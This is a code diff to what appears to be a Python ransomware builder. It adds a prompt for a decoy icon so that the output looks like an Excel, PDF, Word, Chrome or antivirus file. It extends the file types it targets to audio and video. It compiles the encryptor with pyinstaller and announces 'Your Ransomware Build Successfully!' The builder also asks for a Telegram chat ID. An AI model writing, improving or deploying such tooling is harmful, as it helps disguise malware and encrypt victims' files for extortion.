@@ -1,6 +1,7 @@
 import sys
 import time
 import banner
+from subprocess import Popen
 from colorama import Fore
 def create():
     banner.banner()
@@ -17,6 +18,50 @@ def create():
     try:
         banner.banner()
         chat = input(Fore.YELLOW+"\n [!] Enter Your Chat Id In Telegram : ")
+        time.sleep(0.3)
+    except KeyboardInterrupt:
+        print("")
+        sys.exit()
+    try:
+        banner.banner()
+        print(Fore.LIGHTBLUE_EX+"\n [!] Please Enter The Icon Name\n\n Default Set In exel.ico\n")
+        print(Fore.YELLOW+""" Select Icon : 
+        [1] excel
+        [2] pdf
+        [3] rar
+        [4] powerpoint
+        [5] word
+        [6] chrome
+        [7] Counter Strike 
+        [8] Adobe After Effects 
+        [9] Adobe Photoshop 
+        [10] Anti Virus 
+        """)
+        icon_num = input("--> ")
+        number_ico = ()
+        if icon_num == "1":
+            number_ico = ("excel.ico")
+        elif icon_num == "2":
+            number_ico = ("pdf.ico")
+        elif icon_num == "3":
+            number_ico = ("rar.ico")
+        elif icon_num == "4":
+            number_ico = ("powerpoint.ico")
+        elif icon_num == "5":
+            number_ico = ("word.ico")
+        elif icon_num == "6":
+            number_ico = ("chrome.ico")
+        elif icon_num == "7":
+            number_ico = ("Counter-Strike.ico")
+        elif icon_num == "8":
+            number_ico = ("Adobe-After-Effects.ico")
+        elif icon_num == "9":
+            number_ico = ("Adobe-Photoshop.ico")
+        elif icon_num == "10":
+            number_ico = ("Anti-Virus.ico")    
+        else:
+            number_ico = ("excel.ico")
+
         time.sleep(0.3)
     except KeyboardInterrupt:
         print("")
@@ -83,7 +128,7 @@ def drive_finer():
             target_drive.append(i)
     print(target_drive)
 
-    pasvand = ["exe","png","jpg","jpeg","psd","py","txt"]
+    pasvand = ["exe","png","jpg","jpeg","psd","py","txt","mp3","mp4"]
     # for p in pasvand:
     #     try:
     #         with open("log", 'w') as errlog:
@@ -129,4 +174,9 @@ errnot()
     f = open("../modules/encrypt.py","w")
     f.write(path)
     f.close()
-    print(Fore.GREEN+"\n [+]"+Fore.RED+" Place Wait...")
+    with open("loog", 'w') as pylog: 
+        Popen(("pyinstaller --onefile encrypt.py -i icon/"+number_ico), stdout=pylog, stderr=pylog)
+        time.sleep(3)
+        print(Fore.GREEN+"\n [+]"+Fore.RED+" Please Wait...")
+        time.sleep(15)
+        print(Fore.GREEN+"\n [!]"+Fore.RED+" Your Ransomware Build Successfully!Go To /dist Folder")
